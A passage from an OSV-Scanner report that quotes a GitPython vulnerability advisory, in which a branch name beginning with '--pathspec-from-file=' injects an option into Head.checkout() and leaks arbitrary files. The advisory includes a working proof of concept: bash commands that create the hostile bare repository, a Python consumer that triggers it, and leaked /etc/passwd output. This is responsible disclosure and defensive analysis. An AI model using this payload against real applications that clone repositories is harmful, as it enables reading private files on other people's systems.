*\"Arbitrary file read via `--pathspec-from-file` in\n\u003e   `IndexFile.remove()` **and `Head.checkout()`**\"*. Fixed in 3.1.58 by commit `f2550b65`, which added\n\u003e   the guard to this exact method — but only for `**kwargs`.\n\u003e - **CVE-2026-78679** (`GHSA-3wxw-xv34-2frg`) — *\"`TagReference.create` positional reference\n\u003e   bypasses kwargs-only `--file` guard, enabling arbitrary file read (incomplete fix of 3af0c251)\"*. Fixed in 3.1.59 by commit `1b0d2d9b`, which applied the\n\u003e   positional check to `git/refs/tag.py`, `git/diff.py`, `git/index/base.py` and `git/repo/base.py` —\n\u003e   but not to `git/refs/head.py:286`.\n\u003e \n\u003e `f2550b65` states in its own commit message that the audit found the positional variant and applied\n\u003e it to `HEAD.reset` — 185 lines above `Head.checkout`, in the same file, in the same commit:\n\u003e \n\u003e \u003e \"The audit also found that **reset's positional commit could carry the option before its argument\n\u003e \u003e separator**. […] **Check reset's positional commit as well as keyword options**\"\n\u003e \n\u003e `HEAD.reset` got the fix. `Head.checkout` did not, and `1b0d2d9b` did not come back for it.\n\u003e \n\u003e ## Affected Asset\n\u003e \n\u003e | | |\n\u003e |---|---|\n\u003e | Package | `GitPython` (PyPI) |\n\u003e | Affected versions | **`\u003c= 3.1.62`** — all published releases |\n\u003e | Latest release tested | `3.1.62` |\n\u003e | Also present on | `main` @ `4905b4af` |\n\u003e | Vulnerable file | `git/refs/head.py` |\n\u003e | Guard | line 286 — `Git._option_candidates([], kwargs)` |\n\u003e | Sink | line 293 — `self.repo.git.checkout(self, **kwargs)` |\n\u003e | CWE | CWE-88 (Argument Injection), CWE-73 (External Control of File Name or Path), CWE-200 (Exposure of Sensitive Information) |\n\u003e | CVSS 3.1 | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → **7.5 High** |\n\u003e \n\u003e The version range was established by **blob hash against every tag**, not by dates: the sink line\n\u003e `self.repo.git.checkout(self, **kwargs)` — with no `--` separator — is present in `git/refs/head.py`\n\u003e in every tag from `0.3.1-beta2` through `3.1.62`. The `3.1.62` blob is byte-identical to `main`:\n\u003e `7f563374ef9e018b3d5f95054498e8591e112ce2`. Full sweep in `raw/07-blob-version-sweep.txt`.\n\u003e \n\u003e The kwargs-only guard first appears in **3.1.58**, so `3.1.58`–`3.1.62` is where \"incomplete fix\"\n\u003e applies; earlier releases have the same sink with no guard at all.\n\u003e \n\u003e ## Vulnerability Details\n\u003e \n\u003e ### Root cause\n\u003e \n\u003e `git/cmd.py:1045` — `_option_candidates()` only inspects the positionals it is handed:\n\u003e \n\u003e ```python\n\u003e @classmethod\n\u003e def _option_candidates(cls, args: Sequence[Any] = (), kwargs: Optional[Mapping[str, Any]] = None) -\u003e List[str]:\n\u003e     \"\"\"Collect possible option spellings before command-line transformation.\"\"\"\n\u003e     options = [\n\u003e         option for option in cls._unpack_args([arg for arg in args if arg is not None]) if option.startswith(\"-\")\n\u003e     ]\n\u003e ```\n\u003e \n\u003e So `_option_candidates([], kwargs)` means: *check the keyword arguments, never check the positional\n\u003e arguments this method puts on the command line.* That is fine when the method has no\n\u003e attacker-influenced positional, or when it separates them with `--`.\n\u003e \n\u003e `git/refs/head.py:283-293` — `Head.checkout()` has neither:\n\u003e \n\u003e ```python\n\u003e         if not allow_unsafe_options:\n\u003e             Git.check_unsafe_options(\n\u003e                 options=Git._option_candidates([], kwargs),\n\u003e                 unsafe_options=Git.unsafe_git_pathspec_from_file_options,\n\u003e             )\n\u003e         kwargs[\"f\"] = force\n\u003e         if kwargs[\"f\"] is False:\n\u003e             kwargs.pop(\"f\")\n\u003e \n\u003e         self.repo.git.checkout(self, **kwargs)\n\u003e ```\n\u003e \n\u003e `self` is the only positional. It serialises to the branch name, lands in the `git checkout` argv,\n\u003e and is not in the list the guard inspects. `_call_process` builds `args_list = opt_args + ext_args`,\n\u003e so keyword-derived options precede positionals — which is why the rest of the library puts `\"--\"`\n\u003e first (`Remote.fetch/pull/push`, `Repo._clone`, `Repo.archive`, `IndexFile.remove`, `Commit.count`\n\u003e all do). `Head.checkout` does not.\n\u003e \n\u003e ### Why the branch name is attacker-controlled\n\u003e \n\u003e Git accepts a refname whose branch component begins with `-` and contains `/`\n\u003e (`raw/02-refname-accepted-and-cloned.txt`):\n\u003e \n\u003e ```\n\u003e \u003e\u003e\u003e git check-ref-format 'refs/heads/--pathspec-from-file=/etc/passwd'\n\u003e     exit=0  stderr=''\n\u003e     =\u003e un refname que empieza con '-' y lleva '/' es VALIDO para git\n\u003e \n\u003e \u003e\u003e\u003e git -C \u003cbare\u003e update-ref 'refs/heads/--pathspec-from-file=/etc/passwd' beea87239099\n\u003e     exit=0  stderr=''\n\u003e \u003e\u003e\u003e git -C \u003cbare\u003e symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\u003e     exit=0\n\u003e     HEAD del bare = refs/heads/--pathspec-from-file=/etc/passwd\n\u003e     ref en disco como arbol jerarquico: True\n\u003e \n\u003e \u003e\u003e\u003e Repo.clone_from('file://\u003cbare\u003e', \u003cvictim\u003e)   # la app solo clona\n\u003e     ramas LOCALES creadas por el clone, sin que nadie las pida:\n\u003e       refs/heads/--pathspec-from-file=/etc/passwd\n\u003e     repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n\u003e     coincide con el nombre hostil: True\n\u003e ```\n\u003e \n\u003e The transcript above also shows the second half: `git clone` **materialises that branch locally on\n\u003e its own** when the remote `HEAD` points at it — the consuming application never asks for it.\n\u003e \n\u003e A plain git server accepts the refname over `receive-pack`, with no `--force` and no special config\n\u003e (`raw/06-push-accepts-refname.txt`), so the attacker does not need filesystem access to a server —\n\u003e a `git push` is enough. That measurement, and the clone in `raw/02`, both use the `file://`\n\u003e transport, which exercises the same git wire protocol as `https://`; I did not test against a\n\u003e hosted forge, since that would mean writing to a third party.\n\u003e \n\u003e ### Why the leak reaches the caller\n\u003e \n\u003e The file contents are in `CommandError.__str__`, not only in the `.stderr` attribute\n\u003e (`git/exc.py`):\n\u003e \n\u003e ```python\n\u003e         self.stderr = stderr_decode and \"\\n  stderr: '%s'\" % stderr_decode or \"\"\n\u003e \n\u003e     def __str__(self) -\u003e str:\n\u003e         return (self._msg + \"\\n  cmdline: %s%s%s\") % (\n\u003e             self._cmd, self._cause, self._cmdline, self.stdout, self.stderr,\n\u003e         )\n\u003e ```\n\u003e \n\u003e So `logging.exception(...)`, `print(e)`, or simply **not catching** the exception all disclose the\n\u003e file. The developer does not have to know `.stderr` exists.\n\u003e \n\u003e ### Full chain\n\u003e \n\u003e ```\n\u003e Repo.clone_from(\u003cattacker URL\u003e)\n\u003e   ↓  remote HEAD points at refs/heads/--pathspec-from-file=/etc/passwd\n\u003e   ↓  git clone creates that LOCAL branch unasked\n\u003e repo.active_branch                → Head with name = \"--pathspec-from-file=/etc/passwd\"\n\u003e   ↓\n\u003e Head.checkout()                   git/refs/head.py:286 — guard inspects kwargs only\n\u003e   ↓  self.repo.git.checkout(self, **kwargs)   git/refs/head.py:293 — no \"--\"\n\u003e git checkout --pathspec-from-file=/etc/passwd\n\u003e   ↓  git emits one `error:` per unmatched pathspec — one per line of the file\n\u003e GitCommandError → CommandError.__str__ → the consumer\n\u003e ```\n\u003e \n\u003e ## Steps to Reproduce\n\u003e \n\u003e Environment: GitPython 3.1.62, git 2.55.0, Linux x86_64, disposable venv. Everything local —\n\u003e temporary repositories and the `file://` transport. No remote hosts, no third-party repositories.\n\u003e \n\u003e The bundled `poc.sh` runs all seven scenarios as a single unit and writes `poc.log` plus one file per\n\u003e scenario under `raw/`. Minimal manual reproduction:\n\u003e \n\u003e ```bash\n\u003e python3 -m venv /tmp/gp \u0026\u0026 /tmp/gp/bin/python -m pip install gitpython==3.1.62\n\u003e \n\u003e W=$(mktemp -d)\n\u003e git init -q -b main \"$W/a\"; echo x \u003e \"$W/a/f.txt\"\n\u003e git -C \"$W/a\" add f.txt\n\u003e git -C \"$W/a\" -c user.email=a@b -c user.name=a commit -qm c\n\u003e git clone -q --bare \"$W/a\" \"$W/a.git\"\n\u003e SHA=$(git -C \"$W/a.git\" rev-parse HEAD)\n\u003e \n\u003e # the attacker names their default branch after the file they want\n\u003e git -C \"$W/a.git\" update-ref   'refs/heads/--pathspec-from-file=/etc/passwd' \"$SHA\"\n\u003e git -C \"$W/a.git\" symbolic-ref HEAD 'refs/heads/--pathspec-from-file=/etc/passwd'\n\u003e \n\u003e cat \u003e \"$W/consumer.py\" \u003c\u003c'PYEOF'\n\u003e import logging, sys, git\n\u003e logging.basicConfig(level=logging.INFO, format=\"%(message)s\")\n\u003e try:\n\u003e     repo = git.Repo.clone_from(sys.argv[1], sys.argv[2])   # user-supplied URL\n\u003e     repo.active_branch.checkout()                          # ensure a clean working tree\n\u003e except git.exc.GitCommandError:\n\u003e     logging.exception(\"clone failed\")\n\u003e PYEOF\n\u003e \n\u003e /tmp/gp/bin/python \"$W/consumer.py\" \"file://$W/a.git\" \"$W/victim\"\n\u003e ```\n\u003e \n\u003e ### Raw Request\n\u003e \n\u003e The real `git checkout` argv, captured by instrumenting `Git.execute` (`raw/01-real-argv.txt`).\n\u003e This is the command GitPython actually built — the branch name became an option:\n\u003e \n\u003e ```\n\u003e   argv real : ['git', 'checkout', '--pathspec-from-file=/tmp/gpargv-9im8ao2d/SECRET.txt']\n\u003e ```\n\u003e \n\u003e ### Raw Response\n\u003e \n\u003e Observed output (`raw/05-six-line-consumer.txt`, tail) — git emits one `error:` line per unmatched\n\u003e pathspec, which is one per line of the target file:\n\u003e \n\u003e ```\n\u003e error: pathspec 'mysql:x:958:958:MariaDB:/var/lib/mysql:/usr/bin/nologin' did not match any file(s) known to git\n\u003e error: pathspec 'flatpak:x:957:957:Flatpak system helper:/:/usr/bin/nologin' did not match any file(s) known to git\n\u003e error: pathspec 'wazuh:x:956:955:Wazuh Agent:/var/ossec:/usr/sbin/nologin' did not match any file(s) known to git\n\u003e error: pathspec 'jdownloader:x:955:954:jdownloader:/opt/JDownloader/:/bin/false' did not match any file(s) known to git\n\u003e error: pathspec 'cups-browsed:x:953:953:CUPS printer discovery:/:/usr/bin/nologin' did not match any file(s) known to git'\n\u003e ```\n\u003e \n\u003e `raw/03-full-file-disclosure.txt` counts the recovery against the real file:\n\u003e \n\u003e ```\n\u003e Archivo objetivo: /etc/passwd  (34 lineas no vacias)\n\u003e [CASO] repo.active_branch.checkout()  — nadie paso un nombre de rama\n\u003e   repo.active_branch.name = '--pathspec-from-file=/etc/passwd'\n\u003e   -\u003e GitCommandError. Lineas de /etc/passwd recuperadas: 34 de 34\n\u003e ```\n\u003e \n\u003e ## Impact\n\u003e \n\u003e An attacker who can get an application to clone a repository they control reads any file the\n\u003e application's process can read, with the contents returned in band. `/etc/passwd` was recovered in\n\u003e full (34 of 34 lines) in the run recorded in `poc.log`.\n\u003e \n\u003e The attacker needs **no account and no privilege in the consuming application**, and no\n\u003e configuration change anywhere: `allow_unsafe_options=False` is the default, and the vulnerable\n\u003e consumer is six lines of ordinary code. This is the central use case of the library — CI systems,\n\u003e repository importers, scanners and bots that clone user-supplied URLs.\n\u003e \n\u003e ### Impact precondition\n\u003e \n\u003e **Holds if:** the consuming application clones a repository whose default branch name the attacker\n\u003e chose, and then calls `Head.checkout()` on it — most commonly as `repo.active_branch.checkout()`,\n\u003e which needs no branch-name input from the application at all.\n\u003e \n\u003e **Source writer:** the attacker, via the remote repository's `HEAD` and refs. Verified two ways —\n\u003e `git update-ref` + `symbolic-ref` on a bare repository, and `git push` to a plain git server, which\n\u003e `receive-pack` accepts without `--force` or special configuration\n\u003e (`raw/02-refname-accepted-and-cloned.txt`, `raw/06-push-accepts-refname.txt`). The application never\n\u003e writes the branch name; `git clone` materialises it.\n\u003e \n\u003e **Observed in:** `validation/gitpython/head-checkout-positional-pathspec/` — GitPython 3.1.62\n\u003e (latest release) with git 2.55.0, in the single run recorded in `poc.log`\n\u003e (2026-09-10T02:10:23-03:00). File read: `/etc/passwd`, 34 of 34 lines recovered by the caller.\n\u003e \n\u003e \n\u003e ### Limits, stated plainly\n\u003e \n\u003e - Only the full long spelling works, because a refname cannot contain a space and is therefore a\n\u003e   single argv token; `git` rejects the abbreviated forms. This was established while developing the\n\u003e   payload and is **not** part of the attached run — the run exercises the working spelling only.\n\u003e - The attacker must know an absolute path to the target file.\n\u003e - Lines are disclosed only when they do not match a path in the repository. With a one-file hostile\n\u003e   repository none of them do, so the attacker controls this condition too.\n\u003e - The full-file result was measured on **git 2.55.0**, where `git checkout` emits one `error:` per\n\u003e   unmatched pathspec. `GHSA-hh9p-6wh2-4mfc` notes that `--pathspec-from-file` alone quotes only the\n\u003e   first line — that holds for `git rm`, which aborts with `fatal:` on the first. It does not hold for\n\u003e   `git checkout` on 2.55.0.\n\u003e \n\u003e ## Negative control\n\u003e \n\u003e Full statement of what each control isolates and what would invalidate it: `negative-controls.md`.\n\u003e Every batch opens **and closes** with a positive control; if the closing one does not fire, the batch\n\u003e is discarded.\n\u003e \n\u003e **Positive control (opening and closing, 4 batches).** `Head.checkout(pathspec_from_file=\"/etc/passwd\")`\n\u003e — the same payload via kwargs. Fires in every batch:\n\u003e `UnsafeOptionError: --pathspec-from-file is not allowed, use allow_unsafe_options=True to allow it`.\n\u003e This proves the guard exists, is active under the default, and recognises the option — so a null\n\u003e result elsewhere cannot be the instrument failing to reach the code.\n\u003e \n\u003e **Negative control.** The identical call on a branch named `benigna`. One variable changes: the\n\u003e leading `-`. Result: `['git', 'checkout', 'benigna']`, no exception, 0 lines disclosed.\n\u003e \n\u003e **Precision control — the asymmetry inside one file** (`raw/04-precision-control-reset-vs-checkout.txt`).\n\u003e The same payload against the two methods in `git/refs/head.py` that received the guard in the same\n\u003e commit, 185 lines apart:\n\u003e \n\u003e ```\n\u003e [CONTROL DE PRECISION] mismo archivo, mismo commit de fix, dos metodos\n\u003e   HEAD.reset(commit=PAYLOAD)  guard SI mira el posicional BLOQUEADO por el guard (--pathspec-from-file i fuga= 0 lineas  [OK]\n\u003e   Head.checkout()      guard NO mira el posicional     GitCommandError                                fuga=34 lineas  [OK]\n\u003e ```\n\u003e \n\u003e `HEAD.reset` (`head.py:101`, `_option_candidates([commit], kwargs)`) blocks what `Head.checkout`\n\u003e (`head.py:286`, `_option_candidates([], kwargs)`) lets through. This rules out the alternative\n\u003e explanation that any string containing `--pathspec-from-file` reaching git would disclose the file.\n\u003e \n\u003e ## Remediation\n\u003e \n\u003e One line, consistent with what `f2550b65` already did for `HEAD.reset` in this same file:\n\u003e \n\u003e ```python\n\u003e                 options=Git._option_candidates([self], kwargs),\n\u003e ```\n\u003e \n\u003e **The other candidate was evaluated and rejected.** Writing\n\u003e `self.repo.git.checkout(\"--\", self, **kwargs)` would match the `--` pattern used elsewhere in the\n\u003e library and would also cover future `git checkout` options — but it **changes the semantics and\n\u003e breaks the method**: in `git checkout -- \u003carg\u003e`, everything after `--` is a *pathspec*, not a branch.\n\u003e The command would stop switching branches and start restoring files. The `--` pattern works for\n\u003e `fetch`/`pull`/`push`/`clone`/`archive`/`rm` because their positionals genuinely are non-branch\n\u003e operands; it does not transfer here.\n\u003e \n\u003e For defence in depth, `Repo.create_head()` could reject branch names beginning with `-`, which would\n\u003e also close the weaker `PR:L` path. That is a separate, optional change.\n\u003e \n\u003e ## Prior art and de-duplication\n\u003e \n\u003e All GitPython advisories in the GitHub database were reviewed —\n\u003e `gh api advisories -f ecosystem=pip -f affects=GitPython -f per_page=100 --paginate` returns **47**\n\u003e (the same command without `per_page` returns only the first page of 30). `Head.checkout` appears in\n\u003e two rows, one of which (`GHSA-w672-…`) is a withdrawn duplicate, leaving one substantive advisory:\n\u003e \n\u003e - **`GHSA-hh9p-6wh2-4mfc` / CVE-2026-76217** — same method, but the **kwargs** path\n\u003e   (`pathspec_from_file=…, pathspec_file_nul=True`), fixed in 3.1.58. That path is closed today; it is\n\u003e   the positive control in every batch of this report. The **positional** path is not covered by it.\n\u003e \n\u003e Neighbours, none overlapping:\n\u003e \n\u003e - **`GHSA-3wxw-xv34-2frg` / CVE-2026-78679** — the same **class** (positional bypasses a kwargs-only\n\u003e   guard) in a different method, `TagReference.create`, fixed in 3.1.59 by `1b0d2d9b`. That is the\n\u003e   patch that did not come back to `head.py:286`.\n\u003e - **`GHSA-956x-8gvw-wg5v` / CVE-2026-67323** — precedent for \"a value placed before the `--` with no\n\u003e   leading-dash check\", in `Repo.iter_commits` / `Repo.blame`. Those sites now pass their positional\n\u003e   to the guard; this one does not.\n\u003e - **`GHSA-7545-fcxq-7j24` / CVE-2026-44243** — path traversal via ref names in the reference APIs.\n\u003e   Different sink (filesystem path construction) and different impact (write and delete), but it\n\u003e   establishes that attacker-influenced ref names is a premise this project has already accepted.\n\u003e \n\u003e ### No open fix proposal\n\u003e \n\u003e Searched across three surfaces, because `gh search issues` excludes pull requests: `gh search prs`,\n\u003e `gh search issues` and the raw `search/issues` API. **No open or closed issue or pull request\n\u003e proposes passing the positional to the guard in `Head.checkout`.** The three PRs that touch this\n\u003e guard (#2204, #2180, #2163) are all merged and none of them does it — #2204 is the PR that\n\u003e introduced *both* call sites in this file, one checking its positional and one not. Full matrix in\n\u003e `dup-check.md`.\n\u003e \n\u003e ### The project's own tests carry the same asymmetry\n\u003e \n\u003e `test/test_refs.py` exercises the guard for both methods, and covers exactly the difference this\n\u003e report is about:\n\u003e \n\u003e - `HEAD.reset` — the **positional** is tested (lines 304-308).\n\u003e - `Head.checkout` — only the **kwargs** path is tested (lines 282-291).\n\u003e \n\u003e So the positional variant is a case the suite already knows how to write; it just was not written\n\u003e for `checkout`. The docstring added by #2204 to `Head.checkout` states that `--pathspec-from-file`\n\u003e requires opt-in via `allow_unsafe_options` — which is precisely the guarantee the positional path\n\u003e does not deliver. Nothing in the project declares the positional acceptable here.\n\u003e \n\u003e ### Why the one-line fix works, which is not obvious\n\u003e \n\u003e `Reference.__str__` returns `self.name`, not `self.path`. `Reference.name` strips the first two\n\u003e path components (`reference.py:122-132`), so a `Head` constructed on\n\u003e `refs/heads/--pathspec-from-file=/etc/passwd` passes `check_path` — the *path* does begin with\n\u003e `refs/heads/` — while `str()` yields the bare option. Passing `[self]` to `_option_candidates` makes\n\u003e the guard see that same serialised string, which is why the one-line change closes it.\n\u003e \n\u003e ## Evidence\n\u003e \n\u003e | File | What it establishes |\n\u003e |---|---|\n\u003e | `poc.sh` | driver — runs all seven scenarios as one unit |\n\u003e | `poc.log` | full transcript of the single reference run |\n\u003e | `raw/00-versions-and-source.txt` | version under test is the published one; guard and sink present; `def checkout(` appears once, so the sink line is unambiguous |\n\u003e | `raw/01-real-argv.txt` | real `git checkout` argv, captured by instrumenting `Git.execute` |\n\u003e | `raw/02-refname-accepted-and-cloned.txt` | git accepts the refname; `Repo.clone_from` materialises it unasked |\n\u003e | `raw/03-full-file-disclosure.txt` | 34 of 34 lines of `/etc/passwd` recovered |\n\u003e | `raw/04-precision-control-reset-vs-checkout.txt` | `HEAD.reset` blocks what `Head.checkout` allows |\n\u003e | `raw/05-six-line-consumer.txt` | six-line consumer, verbatim; leaks when the exception is logged and when it is uncaught |\n\u003e | `raw/06-push-accepts-refname.txt` | a plain git server accepts the refname over `push` |\n\u003e | `raw/07-blob-version-sweep.txt` | affected range by blob hash, tag by tag |\n\u003e | `negative-controls.md` | what each control isolates and what would invalidate it |\n\u003e | `evidence.sha256` | integrity of every raw file and script |\n\u003e \n\u003e ## Disclosure\n\u003e \n\u003e Reported privately through GitHub private vulnerability reporting. No third-party systems were\n\u003e touched: every repository in this report is a temporary local one, and all transport is `file://`.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | gitpython | 3.1.59 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-23mf-xhv8-69c2 | gitpython | 3.2.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-110859\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-110859",
              "name": "CVE-2026-110859",
